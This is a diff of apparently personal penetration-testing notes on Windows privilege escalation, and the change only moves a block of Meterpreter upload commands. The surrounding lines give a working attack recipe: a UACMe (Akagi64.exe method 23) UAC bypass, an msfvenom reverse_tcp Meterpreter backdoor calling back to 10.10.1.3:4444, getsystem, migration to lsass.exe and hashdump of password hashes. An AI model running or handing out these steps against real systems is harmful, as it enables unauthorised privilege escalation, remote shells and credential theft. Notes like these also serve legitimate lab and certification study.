@@ -12,7 +12,13 @@
 	- eg. exploit/windows/local/ms16_014_wmi_recv_notif
 
 # UACBypass - UACMe 
-
+- Commands:
+<p>:CTRL + C
+cd C:\\Users\\admin\\AppData\\Local\\Temp
+upload /root/Desktop/tools/UACME/Akagi64.exe .
+upload /root/backdoor.exe .
+ls
+</p>
 - need local admin account access
 - migrate process to explorer.exe 
 - pgrep explorer.exe OR ps -S explorer.exe
@@ -22,13 +28,6 @@
 	- Akagi64.exe 23 <payload_path> : run on target computer
 	- Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
 	- msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f exe > 'backdoor.exe'
- - Commands:
-<p>:CTRL + C
-cd C:\\Users\\admin\\AppData\\Local\\Temp
-upload /root/Desktop/tools/UACME/Akagi64.exe .
-upload /root/backdoor.exe .
-ls
-</p>
 - once run, we will get meterpreter session - getprivs/getsystem to get elevated privs
 - migrate to lsass.exe and run hashdump
 
